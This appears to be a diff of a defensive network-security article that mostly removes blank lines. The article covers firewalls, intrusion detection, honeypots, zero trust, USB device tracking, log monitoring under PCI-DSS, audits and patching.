 Transport layer protocols, namely Transmission Control Protocol (TCP) and User Datagram Protocol (UDP), define applications that communicate with each other through port numbers. Port numbers 1 through 1023 are well-known and are assigned by the Internet Assigned Numbers Authority (IANA) to standardized services running with root privileges. For example, Web servers listen on TCP port 80 for client requests. Port numbers 1024 through 49151 are used by various applications with ordinary user privileges. Port numbers above 49151 are used dynamically by applications.
 
 [Mermaid Diagram: An architectural or flow diagram is present here. Diagram details are visually represented.]
-
 
 [Image: Wireshark packet analysis screen: HTTP traffic filtering and packet inspection]
 
@@ -814,9 +697,7 @@ especially those in the higher range. For example, the Sub7 Trojan is known to u
 
 When most people think of network security, firewalls are one of the first things that come to mind. Firewalls are a perimeter security tool that protects an internal network from external threats. A firewall selectively allows or blocks incoming and outgoing traffic. Firewalls can be standalone network devices located at the entrance to a private network or personal firewall programs running on computers. An organization's firewall protects the internal community; A personal firewall can be customized to an individual's needs.
 
-
 [Image: No image description]
-
 
 A firewall that isolates various network zones.
 
@@ -846,9 +727,7 @@ Spam filters work on a corporate and personal level. At the enterprise level, em
 
 A vulnerable computer can put not only itself but the entire community at risk. First of all, a vulnerable computer can attract attacks. If compromised, the host can be used to launch attacks against other hosts. The compromised computer may provide information to the attacker, or there may be trust relationships between computers that could help the attacker. In any case, it is undesirable to have a poorly protected computer in your network.
 
-
 [Image: No image description]
-
 
 Network Access Control
 
@@ -914,9 +793,7 @@ One of the first steps you can take to ensure the security of your network while
 
 So how do you "clean and tighten" your existing network or design a new network that can withstand the inevitable attacks? Let's look at some basics.
 
-
 [Image: No image description]
-
 
 network diagram
 
@@ -929,9 +806,7 @@ Preventive measures, a reactive approach, are necessary and help reduce the risk
 
 IDS approaches can be categorized in at least two ways. One way is to distinguish between host-based and network-based IDSs depending on where detection is done. While a host-based IDS monitors a single computer, a network-based IDS operates on network packets. Another way to view IDSs is through analysis approaches. Traditionally, the two analysis approaches are abuse (signature-based) detection and anomaly (behavior-based) detection.
 
-
 [Image: No image description]
-
 
 Misuse detection and anomaly detection
 
@@ -941,9 +816,7 @@ In practice, intrusion detection faces several challenges: signature-based detec
 
 Network-based IDSs typically monitor network packets for signs of reconnaissance, exploitation, DoS attacks, and malware. They have strengths that complement host-based IDSs: network-based IDSs can see the traffic of a population of hosts; can recognize patterns shared by multiple hosts; and they have the potential to see attacks before they reach hosts.
 
-
 [Image: No image description]
-
 
 IDSs that monitor various network zones.
 
@@ -955,9 +828,7 @@ A variation called an intrusion prevention system (IPS) attempts to combine the 
 
 We monitor our corporate network at the network security layer. At this point, we benefit from many network security systems. So what is the attacker's goal at this layer? and what will we do?
 
-
 [Image: No image description]
-
 
 Network Protection
 
@@ -979,9 +850,7 @@ With Firewall, we can block the malicious IPs we detect and prevent attackers fr
 
 While endpoint security products and network security products are not impenetrable, they present obstacles for attackers to overcome. Attackers trying to bypass these systems waste time and slow down. This creates time for the attack to be detected by security experts. Some cyber attacks can last weeks or even months. As I said before, in the absence of security experts to detect this attack, the attacker will continue his way, albeit slowly.
 
-
 Section: Layer 4: Data Protection - The Last Refuge
-
 
 Once an attack is detected and analyzed, system administrators must provide an appropriate response to the attack. One of the principles in security is that the response should be proportionate to the threat. Obviously, the answer will depend on the circumstances, but a variety of options are available. In general, it is possible to block, slow down, modify or redirect malicious traffic. It is not possible to identify every possible answer. We will explain only two answers here: quarantine and backtracking.
 
@@ -997,9 +866,7 @@ It is important to include recovery after an attack in the plan. This includes i
 
 In our last layer, the data security layer, some systems are used to prevent a data breach. So what is the attacker's goal at this layer? and what will we do?
 
-
 [Image: No image description]
-
 
 Data Protection
 
@@ -1024,7 +891,6 @@ Although these systems are configured correctly, they are not insurmountable lik
 
 Chapter: Looking Ahead: Transitioning from Reactive Reflex to Proactive Strategy
 
-
 This concluding section will synthesize findings from actor profiles to provide a high-level strategic overview of the current and future threat landscape.
 
 Priority of Identity: A clear and general trend is a shift from malware-centric attacks to identity-based infiltrations. Adversaries focus on capturing valid credentials through phishing, password spraying, and social engineering to "log in" rather than "break.".
@@ -1039,9 +905,7 @@ Integrate and Correlate Threat Intelligence: As the naming confusion demonstrate
 
 APT groups continue to pose a persistent and dynamic threat to international relations and national security. Countering these threats requires in-depth and continuous threat intelligence work, which requires not only establishing technical defense mechanisms but also understanding actors' motivations, strategic goals and evolving tactics.
 
-
 Section: Zero Trust Mindset
-
 
 <div style="background: rgba(16, 185, 129, 0.05); border-left: 4px solid #10b981; padding: 15px; margin: 20px 0; border-radius: 6px;">
 <strong style="color: #10b981; font-size: 1.1em;">✅ Zero Trust Maturity Checklist</strong>
@@ -1053,9 +917,7 @@ Section: Zero Trust Mindset
 </ul>
 </div>
 
-
 Section: Fortifying the Identity Perimeter
-
 
 Traditionally, users, also known as employees, have been the weakest link in a company's defense armor. While they are essential to the organization, they can be a nightmare waiting to happen to your network. How do you allow them to operate within the network while controlling their access to resources? You should make sure that your user authentication system knows who your users are.
 
@@ -1104,9 +966,7 @@ Any network security system you implement should retain or archive these logs fo
 
 Going forward, it is important to keep up with constant developments in the field of network security to avoid being left behind. These advances include new systems for addressing threats through a smarter and more autonomous process, and developing and configuring faster and easier ways to keep threat files up to date. Additionally, customization of access rules, authentication requirements, and user role assignments provides significant flexibility. In this process, it is important to subscribe to newsletters, attend seminars and security fairs, read white papers and get support from network security experts if needed. The price to pay for not cutting corners and staying ahead in terms of security is a security breach or security breach.will be less than the cost resulting from negligence.
 
-
 Section: Threat Hunting and Honeypot Culture
-
 
 The basic idea of a honeypot is to learn about attacker techniques by attracting attacks against a seemingly defenseless computer. It is essentially a forensic tool rather than a line of defense. A honeypot can be used to gain valuable information about attack methods used elsewhere or about imminent attacks before they happen. Honeypots are routinely used in research and production environments.
 
@@ -1118,15 +978,11 @@ Third, a honeypot must be isolated from the actual network. Since honeypots are 
 
 Honeypots are generally classified according to their level of interaction, from low to high. Low-interaction honeypots like Honeyd provide simple services. An attacker could try to compromise the honeypot, but he wouldn't gain much. Having limited interactions creates the risk that the attacker will discover that the computer is a honeypot. At the other end of the range, highly interactive honeypots behave more like real systems. They have greater ability to engage an attacker and record activities, but provide greater gain when compromised.
 
-
 Section: Ten Steps to Building a Secure Organization
-
 
 Having identified the key challenges in building a secure organization, let us now examine 10 essential steps to achieving a solid and defensible security posture. The following steps will guide organizations of any size toward robust network security.
 
-
 Section: Assess Risks and Threats
-
 
 Where should you begin when trying to build a secure organization? A common belief is that you must first identify your assets and allocate security resources based on the value of each asset. While this approach is effective, it can lead to significant vulnerabilities. For instance, an infrastructure asset might not have a high standalone value, but it must be protected with the same level of effort as a high-value asset. Otherwise, it could become an entry point into your network, providing access to valuable data.
 
@@ -1153,9 +1009,7 @@ For organizations seeking to identify and measure the risks to their networks an
 
 Another risk assessment tool that can be helpful is the Risk Management Framework (RMF) tool.
 
-
 Section: Beware of Common Misconceptions
-
 
 When addressing an organization's security needs, it is common for professionals to fall prey to some very widespread misconceptions. Perhaps the most common misconception is that the business is obscure, simple, or boring—meaning it is not a target for malicious activity. Businesses must understand that, regardless of the type of enterprise, any network connected to the internet is a potential target.
 
@@ -1170,9 +1024,7 @@ Another common misconception is that an organization is immune to problems cause
 Another common misconception relates to information technology professionals. Many companies pay high salaries to IT staff because they understand that having a properly functioning technical infrastructure is crucial to the company's ongoing success. Because the staff is skilled in setting up and maintaining systems and networks, there is a general assumption that they know everything there is to know about computers.
 While an individual may be highly knowledgeable and technologically advanced, it is important to recognize that no one knows everything about computers. Because management does not understand technology, they are not in a good position to evaluate the depth of a person's knowledge and experience in the field. Decisions are often based on the certifications an individual has obtained throughout their career. Although certifications can be used to gauge a person's competency level, too much weight is often placed on them. Many certifications require little more than some time and dedication to study and pass an exam. Some training companies even offer boot camps that guarantee a person will pass a certification exam. It is possible for people to obtain certifications without any real-world experience with the operating systems, applications, or hardware addressed by the certification. When evaluating a person's competence, look first at their level of experience and background. If the individual has significant real-world experience in addition to obtaining certifications, then the certification is likely a reflection of the employee's true capabilities.
 
-
 Section: Provide Security Training to IT Staff — Now and Always
-
 
 Just as implementing a robust and secure environment is a dynamic process, building a highly skilled staff of security professionals is also a dynamic process. While an organization's technical infrastructure may not change frequently, it is crucial to keep in mind that new vulnerabilities are discovered regularly and new attacks are launched constantly. Additionally, very few organizations have a static infrastructure; employees continually request new software, and more technology is added in an effort to increase efficiency. Each new addition potentially introduces additional vulnerabilities.
 
@@ -1197,9 +1049,7 @@ Telecommunications and network security.
 
 What makes this certification so valuable is that the candidate must have at least five years of professional experience in the field of information security, or four years of experience and a college degree. To maintain the credential, a certified individual must participate in 120 hours of continuing professional education during the three-year certification cycle. This ensures that CISSP holders remain current with the latest trends in security. The CISSP certification is maintained by (ISC)².
 
-
 Section: Think 'Outside the Box'
-
 
 For most businesses, the threat to their intellectual assets and technical infrastructure comes from 'bad guys' sitting outside their organization, trying to get in. These organizations establish strong perimeter defenses, essentially 'encircling' their assets. However, internal employees have access to private information to perform their jobs and often disperse this information to areas that are no longer under the employer's control. This dissemination of data is usually not done with malicious intent; it simply ensures that employees can access data to carry out their work responsibilities more efficiently. This also becomes an issue when an employee leaves the company (or when an active employee loses an item like a laptop where private information is stored) and the organization takes no steps to retrieve or control the private information in the former employee's possession.
 
@@ -1209,14 +1059,11 @@ These devices are not the only threat to data. Since other devices can also be c
 
 Fortunately, Microsoft Windows tracks devices connected to a system in a Registry key named HKEYLOCALMACHINE\SYSTEM\CurrentControlSet\Enum\USBStor. It can be interesting to look at this key on your own computer to see what types of devices have been connected.
 
-
 [Image: Windows Registry Editor showing USBStor key: history of connected USB devices]
 
 Windows Registry — the HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR key records every USB device ever connected.
 
-
 [Image: No image description]
-
 
 Identifying Connected USB Devices in the USBStor Registry Key
 
@@ -1224,9 +1071,7 @@ The figure shows a wide variety of devices connected to a system, including USB 
 
 Another way data can leave an organization's control is through the use of online data storage sites. These sites allow data to be transferred from a computer to a location accessible via the internet. Many of these sites provide 5 GB or more of free storage space. While it is certainly possible to blacklist these sites, there are so many of them, and more are developed regularly, that blocking access to all of them is difficult, if not impossible.
 
-
 Section: Train Employees: Develop a Culture of Security
-
 
 One of the greatest security assets is a business's own employees—but only if they are properly trained to comply with security policies and identify potential security issues.
 
@@ -1236,17 +1081,13 @@ Perhaps the most direct way to gain employee buy-in is to inform them that the m
 
 The goal of these activities is to encourage employees to proactively approach management or the security team. When this begins to happen regularly, you will have expanded the capabilities of your security team and created a much more secure organization.
 
-
 Section: Identify and Use Built-in Security Features of Operating Systems and Applications
-
 
 Many organizations and system administrators state that they cannot build a secure infrastructure because they have limited resources and lack the funds to purchase robust security tools. This is an absurd approach to security because all operating systems and many applications contain security mechanisms that require no organizational resources other than the time to identify and configure them. For Microsoft Windows operating systems, a terrific resource is the Microsoft Learn platform. https://learn.microsoft.com/en-us/security/ You can access the guide developed for Windows Server 2022 at the following link: <https://info.microsoft.com/rs/157-GQE-382/images/EN-WBNR-eBook-SRDEM134534ebook.pdf>
 
 One of the greatest concerns in an organization today is data leakage—ways through which confidential information can leave an organization despite robust perimeter security. As mentioned previously, USB Flash drives are one cause of data leakage; another is the recovery of data located in the unallocated clusters of a computer's hard drive. Unallocated clusters, or commonly known as free space, represent the hard drive area where the operating system and applications discard remnants or leftover data. Although this data cannot be viewed through a standard user interface, it can be easily identified (and sometimes recovered) using a hex editor like WinHex.
 
-
 [Image: No image description]
-
 
 WinHex Displaying the Contents of a Deleted Word Document
 
@@ -1254,9 +1095,7 @@ If a computer is stolen or donated, it is highly probable that someone will acce
 
 'Removes data from available unused disk space on the entire volume. If this option is chosen, all other options are ignored. The specified directory can be anywhere on a local volume. If it is a mount point or points to a directory on another volume, the data on that volume will be removed.'
 
-
 [Image: No image description]
-
 
 Usage of Cipher
 
@@ -1277,9 +1116,7 @@ Non-alphabetic characters (such as !, $, #, %).
 
 It is important to know that all operating systems have embedded tools to assist with security. Finding them usually requires a bit of research, but the time spent identifying them is far less than the money spent purchasing additional security products or recovering from a security breach.
 
-
 Section: Monitoring Systems
-
 
 Even when the most robust security tools are in place, it is crucial to monitor your systems. All security products are human-made and can fail or be compromised. As with other aspects of technology, one should never rely on a single product or tool. Enabling logging on your systems is a way to position your organization to identify problematic areas. The question is, which logs should be recorded? There are some security standards that can assist in determining this. One such standard is the Payment Card Industry Data Security Standard (PCI-DSS). Requirement 10 of the PCI-DSS states that organizations must 'Track and monitor all access to network resources and cardholder data.' If you substitute 'confidential information' for 'cardholder data,' this requirement serves as an excellent approach for a log management program. Requirement 10 is derived here:
 
@@ -1316,15 +1153,11 @@ Requirement 6 seems somewhat challenging, as few organizations have the time to 
 
 An even more detailed approach to monitoring your systems is to install a packet capture tool on your network, allowing you to analyze and capture traffic in real time. One tool that can be highly useful is Wireshark, 'an award-winning network protocol analyzer developed by an international team of network experts.' Wireshark is based on the original packet capture tool Ethereal. Analyzing network traffic is not a trivial task and requires training, but it is perhaps the most accurate way to determine what is happening on your network. The figure shows Wireshark monitoring traffic on a wireless interface.
 
-
 [Image: No image description]
-
 
 Wireshark
 
-
 Section: Hire a Third Party to Audit Security
-
 
 No matter how skilled your staff may be, there is always a chance that they have overlooked something or misconfigured a device or setting. Therefore, bringing in an extra set of 'eyes, ears, and hands' to review your organization's security posture is critical.
 
@@ -1332,9 +1165,7 @@ Although some IT professionals may become paranoid about a third party auditing 
 
 A third-party analysis should involve a two-pronged approach: they should determine how the network looks to attackers and how secure the system is if attackers manage to breach the perimeter defenses. The external review, commonly referred to as penetration testing, can be performed in several ways. The first is an uninformed approach, where consultants are given absolutely no information about the network and systems prior to their analysis. While this is a highly realistic approach, it can be time-consuming and very expensive, as consultants using this method must rely on publicly available information to begin enumerating systems to test. While this is realistic, a partial-information analysis is more efficient and less costly. If a network topology diagram and a list of registered IP addresses are provided, third-party reviewers can complete the assessment more quickly, and the findings can be addressed in a much more timely manner. Once penetration testing is completed, the audit of the internal network can begin. The internal network audit will detect open shares, unpatched systems, open ports, weak passwords, rogue systems, and many other issues.
 
-
 Section: Remember the Basics
-
 
 Many organizations spend too much time and money on perimeter defenses while neglecting some basic security mechanisms.
 
@@ -1342,9 +1173,7 @@ Change Default Account Passwords.
 Use Strong Passwords.
 Close Unnecessary Ports.
 
-
 Section: Patch, Patch, Patch
-
 
 Almost all operating systems have a mechanism that automatically checks for updates. This notification system should be turned on. Although there is some debate about whether updates should be installed automatically, system administrators should at least be notified of updates. Since patches and updates are sometimes known to cause more problems than they solve, administrators may not want them to install automatically. A recent example of this is the CrowdStrike outage: <https://www.cnbc.com/2024/07/19/crowdstrike-outage-impact-8point5-million-windows-devices-microsoft-says-how-to-fix.html>
 
@@ -1374,9 +1203,7 @@ Much can be done to strengthen computers and reduce the risks they are exposed t
 
 As a result, no matter how strong security solutions we have, these products may not be able to completely prevent the attack. However, it is obvious that it will delay it significantly. This creates a time cost for the attacker. Therefore, if the gain on the attacker's side is not worth the time cost, the attack will be deterred. Most importantly, regular monitoring by real experts is necessary to protect against cyber attacks.
 
-
 Section: Conclusion
-
 
 Like the tedious prep work before painting a room, organizations need a good, detailed, and well-written security policy. It's not something to be rushed "just
 To be done, your security policy must be well thought out; in other words, 'the devil is in the details'. Your security policy is designed to get everyone involved in your network "thinking on the same page."
@@ -1385,9 +1212,7 @@ Politics is almost always a work in progress. It must evolve with technology, es
 
 A good security policy is not always a single document; Rather, it is a collection of policies that address specific areas such as computer and network use, authentication styles, email policies, remote/mobile technology use, and Web browsing policies. While it should be comprehensive, it should be written in a way that is easily understood by those it affects. Accordingly, your policy does not need to be overly complex. If you give new employees something the size of War and Peace and tell them they are responsible for knowing its content, you can expect to have ongoing problems maintaining good network security awareness. Keep it simple.
 
-
 [Image: No image description]
-
 
 Security Standards
 
